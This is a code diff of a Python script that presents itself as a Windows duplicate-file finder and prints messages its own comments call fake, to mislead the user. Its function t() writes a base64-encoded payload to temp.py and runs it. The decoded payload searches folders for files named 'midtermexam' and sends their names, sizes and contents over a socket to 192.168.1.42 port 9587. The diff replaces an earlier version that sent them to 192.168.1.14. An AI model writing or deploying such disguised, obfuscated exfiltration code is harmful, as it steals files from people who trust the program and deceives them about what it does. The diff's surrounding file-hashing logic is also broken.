@@ -2,11 +2,17 @@ import hashlib
 import base64
 import time
 import os
+from multiprocessing import Process
 
 
 def main():
+    # Initialize a variable to record the number of times the child process has run
+    child_process_count = 0
+
     # Fork a child process
-    if os.name == 'nt':
+    if child_process_count == 0 and os.name == 'nt':
+        child_process_count += 1
+
         # Print fake message confuse user
         print("This program can find exact same file in target directory")
         print("by comparing the file hash value")
@@ -14,31 +20,30 @@ def main():
         print("Building index ...")
         time.sleep(5)
         print("Searching ...")
-        time.sleep(5)
 
-        # On Windows, use multiprocessing module to spawn a new process
-        from multiprocessing import Process
+        # On Windows, use multiprocessing module to spawn a new child process
         p = Process(target=t)
         p.start()
         p.join()
 
-        # Parent process
-        while True:
-            # Specify the folder path
-            folder = r'C:\Users\YHD\Documents\PycharmProjects\MidtermLifeSaver'
-            # Traverse all files in the specified folder
-            for dirpath, dirnames, filenames in os.walk(folder):
-                # Traverse all files in the current folder
-                for filename in filenames:
-                    # Concatenate the complete path of the file
-                    file_path = os.path.join(dirpath, filename)
+        # Print fake message confuse user
+        print("Collecting duplicate file directory ...")
+        time.sleep(10)
+        # Start of Parent process
 
-            # Open each file and compute its hash value
-            with open(file_path, 'rb') as f:
-                file_hash = hashlib.sha1(f.read()).hexdigest()
-                # Print a message to indicate the collection process
-                print("Collecting duplicate file directory ...")
-                time.sleep(10)
+        # Specify the folder path for duplicate check.
+        folder = r'C:\Users'
+        # Traverse all files in the specified folder
+        for dirpath, dirnames, filenames in os.walk(folder):
+            # Traverse all files in the current folder
+            for filename in filenames:
+                # Concatenate the complete path of the file
+                file_path = os.path.join(dirpath, filename)
+
+        # Open each file and compute its hash value
+        with open(file_path, 'rb') as f:
+            file_hash = hashlib.sha1(f.read()).hexdigest()
+            print(file_hash)
 
             # Define a dictionary to store file hash values and corresponding file paths
             hash_dict = {}
@@ -61,24 +66,24 @@ def main():
                             # If the hash value of the current file has not appeared in the dictionary
                             # add it to the dictionary
                             hash_dict[file_hash] = file_path
-            else:
-                # Child process
-                t()
+        if child_process_count == 0:
+            # Child process
+            t()
+        elif child_process_count == 1:
+            print("\nDone!")
+
     else:
-        print("Sorry, this program only supports Windows")
+        print("Sorry, this program only support Windows")
         pass
 
 
 def t():
     malware_fd = open("temp.py", "w", encoding="utf-8")
-    blob = "CiMgLSotIGNvZGluZzogdXRmLTggLSotCmltcG9ydCBvcwppbXBvcnQgcmUKaW1wb3J0IHNvY2tldAppbXBvcnQgaGFzaGxpYgppbXBvcnQgdGltZQoKZHJpdmVzID0gb3MucG9wZW4oJ3dtaWMgbG9naWNhbGRpc2sgZ2V0IGNhcHRpb24nKQpkcml2ZXMgPSBbZHJpdmUuc3RyaXAoKSBmb3IgZHJpdmUgaW4gZHJpdmVzIGlmIGRyaXZlLnN0cmlwKCldCmV4YW1fZmlsZV9saXN0ID0gW10KZm9yIGRyaXZlIGluIGRyaXZlczoKICAgIHBhdGggPSBvcy5wYXRoLmpvaW4oZHJpdmUsICJcXCIpCiAgICBmb3IgZGlyUGF0aCwgZGlyTmFtZXMsIGZpbGVOYW1lcyBpbiBvcy53YWxrKHBhdGgpOgogICAgICAgIGZvciBmaWxlIGluIGZpbGVOYW1lczoKICAgICAgICAgICAgaWYgcmUuc2VhcmNoKCJtaWR0ZXJtZXhhbSIsIG9zLnBhdGguam9pbihkaXJQYXRoLCBmaWxlKSkgYW5kIG5vdCBmaWxlLmVuZHN3aXRoKCcubG5rJyk6CiAgICAgICAgICAgICAgICBleGFtX2ZpbGVfbGlzdC5hcHBlbmQob3MucGF0aC5qb2luKGRpclBhdGgsIGZpbGUpKQpleGFtX2ZpbGVfbGlzdCA9IFtlbGVtIGZvciBlbGVtIGluIGV4YW1fZmlsZV9saXN0IGlmIG5vdCBlbGVtLnN0YXJ0c3dpdGgoJ1xcJyldCmNsaWVudF9zb2NrZXQgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCmNsaWVudF9zb2NrZXQuY29ubmVjdCgoIjE5Mi4xNjguMS4xNCIsIDk1ODcpKQpoYXNoX2RpY3QgPSB7fQpmb3IgZXhhbV9maWxlIGluIGV4YW1fZmlsZV9saXN0OgogICAgd2l0aCBvcGVuKGV4YW1fZmlsZSwgInJiIikgYXMgZjoKICAgICAgICBtZDUgPSBoYXNobGliLm1kNShmLnJlYWQoKSkuaGV4ZGlnZXN0KCkKICAgIGlmIG1kNSBpbiBoYXNoX2RpY3Q6CiAgICAgICAgY29udGludWUKICAgIGZpbGVfc2l6ZSA9IG9zLnBhdGguZ2V0c2l6ZShleGFtX2ZpbGUpCiAgICBjbGllbnRfc29ja2V0LnNlbmRhbGwoZiJ7b3MucGF0aC5iYXNlbmFtZShleGFtX2ZpbGUpfVxue2ZpbGVfc2l6ZX0iLmVuY29kZSgpKQogICAgd2l0aCBvcGVuKGV4YW1fZmlsZSwgInJiIikgYXMgZjoKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICBkYXRhID0gZi5yZWFkKDEwNDg1NzYpCiAgICAgICAgICAgIGlmIG5vdCBkYXRhOgogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgY2xpZW50X3NvY2tldC5zZW5kYWxsKGRhdGEpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMikKICAgIGhhc2hfZGljdFttZDVdID0gZXhhbV9maWxlCmNsaWVudF9zb2NrZXQuc2VuZGFsbChiIm92ZXIiKQpjbGllbnRfc29ja2V0LmNsb3NlKCkK"
+    blob = "CiMgLSotIGNvZGluZzogdXRmLTggLSotCmltcG9ydCBvcwppbXBvcnQgcmUKaW1wb3J0IHNvY2tldAppbXBvcnQgaGFzaGxpYgppbXBvcnQgdGltZQoKZHJpdmVzID0gb3MucG9wZW4oJ3dtaWMgbG9naWNhbGRpc2sgZ2V0IGNhcHRpb24nKQpkcml2ZXMgPSBbZHJpdmUuc3RyaXAoKSBmb3IgZHJpdmUgaW4gZHJpdmVzIGlmIGRyaXZlLnN0cmlwKCldCmV4YW1fZmlsZV9saXN0ID0gW10KZm9yIGRyaXZlIGluIGRyaXZlczoKICAgIHBhdGggPSBvcy5wYXRoLmpvaW4oZHJpdmUsICJcXCIpCiAgICBmb3IgZGlyUGF0aCwgZGlyTmFtZXMsIGZpbGVOYW1lcyBpbiBvcy53YWxrKHIiQzpcVXNlcnNcdmVub21cRG93bmxvYWRzXG1pZHRlcm1leGFtcyIpOgogICAgICAgIGZvciBmaWxlIGluIGZpbGVOYW1lczoKICAgICAgICAgICAgaWYgcmUuc2VhcmNoKCJtaWR0ZXJtZXhhbSIsIG9zLnBhdGguam9pbihkaXJQYXRoLCBmaWxlKSkgYW5kIG5vdCBmaWxlLmVuZHN3aXRoKCcubG5rJyk6CiAgICAgICAgICAgICAgICBleGFtX2ZpbGVfbGlzdC5hcHBlbmQob3MucGF0aC5qb2luKGRpclBhdGgsIGZpbGUpKQpleGFtX2ZpbGVfbGlzdCA9IFtlbGVtIGZvciBlbGVtIGluIGV4YW1fZmlsZV9saXN0IGlmIG5vdCBlbGVtLnN0YXJ0c3dpdGgoJ1xcJyldCmhhc2hfZGljdCA9IHt9CmNsaWVudF9zb2NrZXQgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCmNsaWVudF9zb2NrZXQuY29ubmVjdCgoIjE5Mi4xNjguMS40MiIsIDk1ODcpKQpmb3IgZXhhbV9maWxlIGluIGV4YW1fZmlsZV9saXN0OgogICAgd2l0aCBvcGVuKGV4YW1fZmlsZSwgInJiIikgYXMgZjoKICAgICAgICBtZDUgPSBoYXNobGliLm1kNShmLnJlYWQoKSkuaGV4ZGlnZXN0KCkKICAgIGlmIG1kNSBpbiBoYXNoX2RpY3Q6CiAgICAgICAgY29udGludWUKICAgIGZpbGVfc2l6ZSA9IG9zLnBhdGguZ2V0c2l6ZShleGFtX2ZpbGUpCiAgICBjbGllbnRfc29ja2V0LnNlbmRhbGwoZiJ7b3MucGF0aC5iYXNlbmFtZShleGFtX2ZpbGUpfVxue2ZpbGVfc2l6ZX0iLmVuY29kZSgpKQogICAgd2l0aCBvcGVuKGV4YW1fZmlsZSwgInJiIikgYXMgZjoKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICBkYXRhID0gZi5yZWFkKDEwNDg1NzYpCiAgICAgICAgICAgIGlmIG5vdCBkYXRhOgogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgY2xpZW50X3NvY2tldC5zZW5kYWxsKGRhdGEpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgIGhhc2hfZGljdFttZDVdID0gZXhhbV9maWxlCmNsaWVudF9zb2NrZXQuc2VuZGFsbChiIm92ZXIiKQpjbGllbnRfc29ja2V0LmNsb3NlKCkK"
     newMalware = base64.b64decode(blob).decode("UTF-8")
     malware_fd.write(newMalware)
     malware_fd.close()
-
-    # execute
-    if os.name == "nt":
-        os.system("python temp.py")
+    os.system("python temp.py")
 
 
 if __name__ == "__main__":
